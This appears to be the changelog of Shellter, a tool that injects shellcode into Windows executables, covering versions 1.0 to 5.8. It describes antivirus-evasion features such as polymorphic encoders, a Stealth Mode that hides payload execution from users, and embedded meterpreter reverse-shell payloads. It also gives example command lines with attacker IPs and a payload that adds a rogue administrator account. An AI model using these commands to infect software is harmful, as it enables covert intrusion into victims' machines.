@@ -1,0 +1,739 @@
+Shellter v1.0
+...............
+
+Released 27d/5m/2014
+
+
+
+
+Shellter v1.1
+...............
+
+Released 21d/06m/2014
+
+[+] Added Advanced/Basic Mode Selection
+
+[+] Verify that PE image file is indeed a native 32-bit application.
+
+[+] Minor changes in error notifications.
+
+[+] Internal source code optimizations.
+
+
+
+
+Shellter v1.2
+...............
+
+Released 06d/07m/2014
+
+[+] Fixed file share permissions conflicts when injecting to some installers
+   (NSIS).
+
+    Reported by : James Chapman
+
+[+] Added user notification if EntryPoint is not located in the first section.
+
+[+] Internal optimizations.
+
+
+
+
+Shellter v1.3
+...............
+
+Released 26d/07m/2014
+
+[+] Added timed tracing in Basic Mode. 
+    Shellter will trace a random number of instructions, for a maximum time of
+    approximately 30 seconds.
+
+
+
+
+Shellter v1.4
+...............
+
+Released 28d/07m/2014
+
+[+] Fixed not showing logo issue when running Shellter in low resolution. 
+
+    Reported by: Nikolaos Tsapakis
+
+
+
+
+Shellter v1.5
+...............
+
+Released 02d/08m/2014
+
+[+] Fixed a potential error issue during process creation.
+
+[+] Added CREATE_NEW_CONSOLE flag to avoid I/O issues when tracing console applications.
+
+[+] Fixed a potential invalid pointer dereference issue when parsing a malformed PE file.
+
+
+
+
+Shellter v1.6
+...............
+
+Released 04d/08m/2014
+
+[+] Fixed a potential uninitialized variable access issue.
+
+[+] Minor updates in PE file validation method.
+
+[+] Other minor updates/optimizations.
+
+
+
+
+Shellter v1.7
+...............
+
+Released 06d/08m/2014
+
+[+] Minor updates/optimizations.
+
+
+
+
+Shellter v1.7 Wine Beta #1
+............................
+
+Released 12d/08m/2014
+
+[+] Native Windows & Wine/CrossOver Compatible.
+
+[+] Optimized tracer. 
+    Up to 3 times faster when tracing over code that makes frequent
+    calls to functions outside the PE image. Testing has been applied
+    using this build vs the Windows-Only build by tracing the same PE
+    target for a relatively big number of instructions.
+
+[+] Removed tracing option: 'Start Trace from EntryPoint/System DLL'.
+    This option was mostly for testing and it will probably be replaced
+    with another.
+    This option is still available in the Windows-Only compatible build.
+
+Known issues: In some cases, the tracer might return RMEM_ERROR_02 and stop
+              tracing.You can still use the traced execution flow up to that
+              point and proceed with the injection stage.
+              I am currently trying different approaches to solve issues that
+              might influence the tracing stage, even though these are quite
+	      rare. These issues don't apply in the Windows-Only compatible
+              build.
+
+
+
+
+Shellter v1.8
+...............
+
+Released 01d/11m/2014
+
+[+] Merged Native Windows & Windows/Wine Tracing Engines.
+
+[+] Added command line support for the Basic Mode.
+    Start Shellter using '--h' argument to get more information regarding 
+    the supported arguments.
+
+[+] Added option to choose Tracing Engine. Only applies under Native Windows.*
+
+[+] Removed tracing option: 'Start Trace from EntryPoint/System DLL'.
+
+Knows issues: See notes in the previous update regarding the Windows/Wine
+              tracing engine. These issues don't apply when choosing the
+              Native Windows tracing engine.
+
+*Note: When running under Wine, the Tracing Engine is selected automatically.
+
+
+
+
+Shellter v1.9
+...............
+
+Released 22d/11m/2014
+
+[+] Automated usage of encoded-payload handlers in Basic Mode.
+    Even when operating under Basic Mode, Shellter will take
+    advantage of this feature that was only available from
+    Advanced Mode so far.
+    Shellter will only change section's permissions if the PE
+    target doesn't support any of the available methods, or if
+    the user changes this setting from the cmdline.
+    
+
+
+[+] Enhanced cmdline support.
+    Allows the user to customise Basic Mode operation and make
+    use of some features and options that were previously only
+    available in Advanced Mode.
+
+*Note: When using the Basic Mode with cmdline flags, if an
+       encoded payload is specified then the user needs to set
+       both the '--enc' flag as well as the '--handler'.
+       Start Shellter using '--h' to see how to use the cmdline
+       options.
+
+[+] Fixed a potential read-out-of-bounds issue in the cmdline
+    parser.
+
+[+] Minor UI and internal optimizations.
+
+
+
+
+Shellter v2.0
+...............
+
+Released 16d/12m/2014
+
+[+] Added user notification about the minimum required Win
+    OS version for the target PE.
+    This allows the user to avoid situations where he makes
+    use of an application that will not run properly in the
+    victim host in case there is an earlier version of
+    Windows.
+
+[+] Enhanced UI with more user-friendly output.
+
+[+] Cmdline updates.
+    Changed help menu switch to '-h' and '--help', and verbose
+    mode to '-v'.
+
+[+] Completely removed manual tracing engine selection.
+    Shellter will pick up the appropriate one depending on 
+    whether you run it in a native Windows host or in Wine.
+    This means that the user is no longer allowed to select
+    the Wine compatible engine when running Shellter in a
+    native Windows host.
+
+[+] All-threads tracing option is not shown as 'Beta' feature.
+
+[+] Various optimizations in both tracing engines.
+
+[+] Updated Wine/Crossover compatible tracing engine.
+    Solved compatibility issues with some applications, and
+    some known issues that were mentioned in the previous
+    updates.
+
+[+] Fixed a shared access violation issue that occurred sometimes
+    when updating the CheckSum field in the PE header.
+    This issue didn't affect the rest of the injection process.
+
+[+] Added an icon in the executable.
+
+
+
+
+Shellter v2.1
+...............
+
+Released 01d/02m/2015
+
+[+] Fixed a couple of potentially bug causing issues.
+
+[+] Added several extra checks to enhance error handling during
+    injection stage.
+
+[+] Displays the name of the PE section where the shellcode was 
+    injected.
+
+[+] Minor updates/optimizations.
+
+
+
+
+Shellter v2.2
+...............
+
+Released 07d/02m/2015
+
+[+] Automatic Backup of the original PE file.
+
+[+] Minor changes in error-display notifications.
+
+
+
+
+Shellter v3.0
+...............
+
+Released 18d/05m/2015
+
+[+] Polymorphic IAT type handlers for encoded payloads.
+    This is a major upgrade which dramatically enhances
+    polymorphism in the final output. This feature breaks
+    down the stubs of those handlers and binds them with
+    thread context aware polymorphic code.
+
+[+] Introduced Auto/Manual mode selection.
+    This was a necessary change since the originally called 
+    'Basic' mode was far from basic for some time now.
+    So Basic/Advanced mode selection has been dropped.
+
+[+] Introduced injection verification stage.
+    After successful injection, Shellter will verify that the
+    first instruction of the injected code will be reached
+    successfully.
+    If polymorphic code has been added, then the first instruction
+    refers to that and not to the effective payload. 	
+
+[+] Introduced '--polyIAT' switch and the option to obfuscate
+    the chosen IAT type handler in 'Auto' and 'Manual' modes
+    respectively.
+    They both take advantage of the same feature.
+
+*Note: When using Auto mode without cmdline arguments, this
+       feature is enabled by default. 
+       If cmdline arguments are used, the aforementioned
+       switch has to be set to enable this feature.
+
+[+] When using Shellter with Wine, the associated operation
+    mode is not shown as 'Beta' anymore.
+      
+[+] Several optimizations in adjusting IAT type handlers.
+
+[+] Several internal design optimizations.
+
+[+] Some minor changes/updates/optimizations.
+
+
+
+
+Shellter v3.1
+...............
+
+Released 30d/05m/2015
+
+[+] Automatic adjustment of the console fonts when running Shellter
+    in Windows >= Vista. Applies also in Wine with the appropriate
+    settings.
+	
+[+] Shellter console is now automatically positioned at the centre
+    of the main monitor.
+
+	
+[+] Fixed a typo in IAT handler obfuscation stage: T.C.A was showing
+    as C.T.A.
+
+[+] Displays the amount of time elapsed during IAT handler obfuscation.
+
+
+
+
+Shellter v4.0
+...............
+
+Released 05d/07m/2015
+
+[+] Custom Proprietary Encoder.
+    This a major upgrade that facilitates direct usage of non-encoded
+    payloads generated by metasploit, or created by the user.
+    Shellter will apply its own random dynamic encoding layer and will
+    generate every time a new decoder based on that.
+    Cmdline switch: --encode
+	
+[+] Polymorphic Decoder.
+    Shellter can apply an extra layer of obfuscation over the generated
+    decoder by using thread context aware polymorphic code.
+    Cmdline switch: --polydecoder
+
+[+] Dynamic Thread Context Keys.
+    Another major upgrade and unique feature of Shellter. This feature
+    automates the usage of dynamic thread context information of the
+    original execution flow of the application as encoding keys.
+    Cmdline switch: --DTCK
+	
+[+] Reflective DLL loaders support.
+    Another major upgrade feature which allows the user not just to
+    use raw shellcode, but even an entire DLL file that contains a
+    a reflective loader function.
+    The user can even choose to encode the entire DLL by using Shellter's
+    proprietary encoder as mentioned above.
+    Feature suggested by: Tom Wilson
+    Cmdline switch: --reflective <FuncName>
+	
+[+] Embedded Payloads.
+    This new feature, allows the user to make use of some commonly used
+    payloads without the need to generate them through metasploit.
+    The user can choose to apply Shellter's encoder as mentioned above.
+    It is always recommended to use encoded payloads. If a payload is
+    not encoded, like those embedded in Shellter, then encode it through
+    Shellter by using the --encode cmdline switch.
+	
+    Payloads List
+    -------------
+    [1] meterpreter_reverse_tcp
+    [2] meterpreter_reverse_http
+    [3] meterpreter_reverse_https
+    [4] meterpreter_bind_tcp
+    [5] shell_reverse_tcp
+    [6] shell_bind_tcp
+    [7] WinExec
+	
+    Examples: -p meterpreter_reverse_tcp --port 5656 --ip 192.168.0.6
+	          -p winexec --cmd calc.exe
+	
+[+] Enhanced injection selection point.
+    This feature enhances the randomization regarding the injection point
+    when using Shellter in Auto mode.
+	
+[+] Extra cmdline switches.
+
+    --list: Shows a list of the embedded payloads.
+
+    --encode: Apply Shellter's encoder over the payload.
+	
+    --polydecoder: Obfuscate the generated decoder by using thread context
+	               aware polymorphic code.
+
+    --DTCK: Experimental feature that uses dynamic thread context information
+            from the original execution flow of the target PE as keys for 
+            payload encoding.
+				   
+    --reflective <FuncName>: Marks the submitted payload as a DLL and defines
+	                     the function name of the reflective loader.
+	
+    --ip: Specifies the IPv4 address used by the reverse connection payloads.
+	
+    --port: Specifies the port number used by the reverse and bind connection
+            payloads.
+			
+    --cmd: Specifies the cmdline argument for the WinExec payload.
+
+[+] All threads tracing is now enabled by default even when cmdline is used.
+    Specifying '--trace all' is now obsolete. However, the user can choose
+    to only trace the main thread by specifying '--trace main' in the cmdline.
+    However, this is not recommended.
+	
+[+] Increased console buffer when using Shellter under Wine. The user can now
+    scroll up the console output and review the available information.
+
+[+] Fixed a bug that occasionally caused wrong adjustment of some injected
+    random Call instructions during IAT handler obfuscation. This bug was
+    eventually triggered with calc.exe and notepad.exe only when the
+    aforementioned feature was used, so it took some time to realize its
+    existence.
+
+[+] Various optimizations, changes, and bug fixes.
+
+
+
+
+Shellter V
+............
+
+Released 08d/08m/2015
+
+[+] Stealth Mode.
+    This is a major upgrade that combines dynamic PE infection with a RedTeam
+    functionality. This means that while you are not losing any of the unique
+    benefits of the dynamic PE infection that Shellter provides, you can also
+    preserve the original functionality of the infected application.
+    This means, that the application will run as it should, while the execution
+    of the payload is completely transparent to the user.
+    When you enable this feature, Shellter automatically enables its own encoder
+    and IAT type handling. In a few words, when Stealth Mode is enabled the --enc,
+    --encode, and handler --IAT flags are automatically set. So you don't have to
+    specify them yourself.
+	
+   Example: shellter -f <target.exe> -p <payload.bin> --stealth --polydecoder
+	    --polyiat --junk
+			 
+   Example: shellter -f <target.exe> -p meterpreter_reverse_tcp --port 4545
+	    --ip 192.168.0.6 --stealth --polyIAT --polyDecoder --junk
+
+   Important: Take a look at the documentation of this feature in readme.txt,
+              before using it.
+	
+[+] Dynamic Injection of Multiple Payloads.
+    Thanks to the combination of the Stealth Mode with the dynamic PE infection
+    that Shellter provides, you can infect multiple times the same PE file using
+    different payloads as long as you always enable the Stealth Mode feature.
+
+    For example, you can inject a "meterpreter_reverse_tcp" stager and then
+    infect again the same PE file with an "Add User" payload, and so on.
+    Every layer of infection will be using a unique dynamic approach with a
+    different encoding, a randomly picked up IAT handler, and extra obfuscation
+    if you choose to apply this by using the --polyDecoder and --polyIAT
+    switches. In addition, you can use the --junk switch to add some extra junk
+    polymorphic code.
+	
+[+] Added -s / --stealth command line switches to enable Stealth Mode when
+    using Shellter from the command line.
+	
+[+] Added option to enable Stealth Mode feature from the Manual Mode, and from
+    the Auto Mode when command line arguments have not been used.
+
+[+] Deletes dropped Disasm.dll when Shellter terminates normally.
+
+[+] Various updates, fixes, optimizations.
+
+
+
+
+Shellter V [5.1]
+..................
+
+Released 12d/08m/2015
+
+[+] Fixed a shared-access-violation issue during injection stage, which was
+    occasionally caused by a Close/Open file handle race condition when Stealth
+    Mode was enabled.
+	
+[+] Fixed an issue with the embedded WinExec payload which would cause the
+    process of the infected PE file to be terminated after the execution of the
+    payload had finished, even though Stealth Mode was used.
+
+[+] Default time tracing in Auto Mode is 30 seconds when using Shellter inside
+    native Windows hosts and 60 seconds when using Shellter in Wine. I decided
+    to increase the tracing time in the second case because the whole tracing
+    process is much slower in Wine. In this way we manage to compensate against
+    the slower tracing speed that is inevitable when we use Shellter in Wine.
+
+[+] Minor changes, fixes, optimizations.
+
+
+
+
+Shellter V [5.2]
+..................
+
+Released 11d/10m/2015
+
+[+] Added domain names support for the embedded Meterpreter_Reverse_HTTP/HTTPS
+    payloads.
+    Note: You can always use domain names even with payloads not embedded in
+          Shellter. You just need to generate the payload in raw format so that
+          you can feed it to Shellter as a file. This was always supported.
+
+[+] Introduced the --lhost switch for specifying the attacker's server by IP or
+    domain name.
+	
+[+] The --ip switch has been dropped (see above).
+
+[+] Introduced --examples switch to show usage examples which were previously
+    shown in the help menu.
+
+[+] Enhanced command line parser.
+    Added some extra checks over the supported arguments. Shellter will notify
+    the user in case a switch/option specified is either not supported or
+    potentially not used correctly.
+
+[+] Fixed a design issue that wouldn't allow the user to choose one of the
+    embedded payloads if the name was mistyped in the command line. In that
+    case Shellter would only accept a payload from a file. This has now been
+    fixed so that if the user mistyped either the name of the embedded payload
+    or the name of the file containing the payload data; Shellter will always
+    give the option to choose again between a listed or a custom one.
+
+[+] Fixed a potential usage of an unitialized pointer while reading the payload
+    data from a file when specific settings were enabled.
+
+[+] A few updates/corrections in the documentation (readme.txt) file.
+	
+[+] Various internal updates and optimizations.
+
+
+
+
+Shellter V [5.3]
+..................
+
+Released 24d/10m/2015
+
+[+] Enhanced 'Junk' and 'Thread Context Aware' Polymorphic code generation
+    engines. More instructions are now supported for a more randomized
+    output.
+
+[+] Ultra fast polymorphic code generation.
+
+[+] Tracing Engine modifications.
+    Up to version 5.2 Shellter would keep tracing the main thread even if more
+    than one threads were created while the user had chosen to trace only the
+    main one. This could potentially cause some issues, since during execution
+    flow filtering Shellter would be not aware of what and where was executed
+    in another thread.
+    From version 5.3 if the user chooses to only trace the main thread, or log
+    dynamic thread context information to use dynamic thread context keys, then
+    once a new thread is created Shellter will exit the tracing stage in order
+    to be able to provide more reliable results during the execution flow
+    filtering.
+    In Auto Mode All-Threads-Tracing is enabled by default, but if command line
+    is used, then it can be disabled using the '--trace main' switch.
+    In Manual Mode, Shellter will ask the user to choose between the two.
+
+[+] Fixed a design error that was introduced by a recent update which would
+    allow a user to specify an empty 'CMD' command string when the embedded
+    WinExec payload was used.
+
+[+] Various internal updates and optimizations.
+
+
+
+
+Shellter V [5.4]
+..................
+
+Released 31d/10m/2015
+
+[+] User Defined Encoding Sequence.
+    This feature allows the user to optionally choose a personalised encoding
+    scheme based on the supported encoding operators.
+    In Manual Mode, Shellter will ask the user to enable this feature or not.
+    In Auto mode, this feature is only available through the command line by
+    extending the --encode switch with the encoding sequence between '{}'.
+    When the user specifies the encoding sequence in Manual mode, then the
+    '{}' characters must not be entered.
+    
+    Auto mode - Command line Example: --encode {!^+}
+   
+    Manual mode - Enter Encoding Sequence: !^+
+
+    When Auto mode is used through the command line, if the user only sets the
+    --encode switch without specifying an encoding scheme, Shellter will build
+    its own random encoding sequence as it was done until now.
+    Note: Before using this feature, it is recommended that you read about it
+          in the documentation regarding Shellter's proprietary encoder.
+          This feature should only be used by advanced users.
+
+[+] Help menu updates.
+
+[+] A few updates/corrections in the documentation (readme.txt) file.
+
+[+] Updated usage examples with proper explanation on the given command line.
+    Run shellter with the --examples switch to display them.
+
+[+] Various internal updates and optimizations.
+
+    
+
+
+Shellter V [5.5]
+..................
+
+Released 31d/10m/2015
+
+[+] Fixed an error in the user-defined-encoded-sequence parser that would make
+    Shellter recognize valid sequences as invalid, thus making this feature
+    unusable from Manual mode.
+
+    Reported by: @fancy__04
+
+[+] Updated the XOR encoding operator from '^' to 'x'.
+    The original operator was fine when testing this new feature from visual 
+    studio, but apparently using the '^' character in Windows command prompt
+    is really a bad idea. I totally forgot about this since, Visual Studio
+    uses the command line as a parameter to CreateProcess(), which in that
+    case there is no issue. The impact was that the XOR operations were
+    eliminated from the supplied encoding sequence when using the command
+    line.
+
+    Example using the new XOR operator: --encode {!x-x+}
+
+[+] Applied all relevant documention updates.
+
+
+
+
+Shellter V [5.6]
+..................
+
+Released 07d/11m/2015
+
+[+] Added an extra verification check over the user-defined-encoding-sequence
+    feature that checks for insecure concatenations of encoding operators.
+    It aims to protect this feature from being used in a totally wrong way.
+    However, it is still recommended that this feature should only be used by
+    advanced users.
+
+[+] Fixed an error in the user-defined-encoding-sequence buffer initialization
+    which could cause later to ignore the user supplied sequence and trigger
+    the random encoding scheme generation from Shellter. In that case the
+    payload would be encoded, but without using the encoding scheme that was
+    defined by the user.
+
+[+] Decreased the maximum of extra delay that is applied before the execution
+    of the payload, when Stealth mode is not enabled.
+
+[+] Several internal optimizations.
+
+
+
+
+Shellter V [5.7]
+..................
+
+Released 14d/11m/2015
+
+[+] Enhanced thread-context-aware polymorphic code engine.
+    More instructions supported with even more randomized
+    output.
+
+[+] Optimized CTRL event listener.
+    In tracing mode, the user can still interrupt that stage and proceed with
+    the rest of the injection process by pressing CTRL+C, but after this stage
+    Shellter disables processing CTRL+C as a signal in order to protect itself
+    from being accidentally terminated during the injection stages. In case
+    an error occurs, or at successful completion of injection, processing of
+    CTRL+C is re-enabled.
+
+[+] Automatic deletion of the dropped Disasm.dll module even when Shellter is
+    terminated by closing the console window. If multiple instances of Shellter
+    are running, then the aforementioned module will be deleted once the last
+    instance of Shellter is terminated.
+    Note: This doesn't apply in case Shellter is terminated by another process,
+          such as the task manager.
+
+[+] Added a user reminder at the PE file backup stage. 
+    Always remember that the .bak file is the previous state of what you are
+    going to generate.
+    In other words, the first time you infect a PE file, the .bak file is the
+    clean PE file. If you decide to add another payload to that PE file, then
+    the new .bak file is the PE file already infected with one payload.
+
+[+] Updated section 8 of the current documentation (readme.txt) file.
+
+[+] Various internal updates and optimizations.
+
+
+
+
+Shellter V [5.8]
+..................
+
+Released 22d/11m/2015
+
+[+] Command line parser modifications.
+    A few changes have been made in the command line parser to ensure that certain
+    arguments are passed in a specific order. This modification will later serve
+    one of the new features of the upcoming advanced edition of Shellter.
+    In particular, when specifying one of the embedded payloads, then the options
+    for that payload (--lhost, --port, --cmd) must now follow immediately after.
+    
+    Examples: -p meterpreter_reverse_tcp --lhost 192.168.0.9 --port 3465
+              -p meterpreter_bind_tcp --port 4565
+              -p winexec --cmd "cmd.exe /c net user evil password /ADD"
+
+[+] Shellter will now exit automatically when command line arguments have been used,
+    in order to facilitate it's usage through scripting.
+
+[+] When '-h/--help' and '--examples' command line arguments are used, Shellter will
+    now print all the output at once, so that the user can easily save it into a file
+    and read it from there.
+
+[+] List of usage examples has been updated.
+    Run Shellter using --examples argument to display them.
+
+[+] Minor updates/corrections in the documentation and in the help menu.
+    Run Shellter using -h/--help arguments to display the list of supported arguments
+    with further explanation.
+
+[+] Various internal updates and optimizations.
+     
